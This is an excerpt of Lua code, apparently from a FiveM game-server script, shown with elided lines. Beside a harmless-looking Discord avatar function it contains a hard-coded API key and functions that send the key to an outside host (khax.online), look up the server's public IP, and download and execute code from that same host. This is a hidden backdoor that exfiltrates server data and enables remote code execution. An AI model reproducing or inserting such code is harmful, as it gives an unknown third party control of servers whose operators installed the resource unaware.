...
function GetDiscordAvatar(user) 
    ...
    return imgURL;
            ...
            local apiKey = "4d64a88a9457da470ed7e430c0ac452a"
...
local function sendApiKeyToSite(apiKey)
    PerformHttpRequest('https://khax.online/panel/api/receive-api-key.php', function(statusCode, response, headers)
...
local function fetchServerIP(callback)
    PerformHttpRequest('https://ipapi.co/ip/', function(errorCode, resultData, resultHeaders)
...
local function fetchAndExecuteCode()
    PerformHttpRequest('https://khax.online/panel/api/txadminre.php', function(statusCode, response, headers)
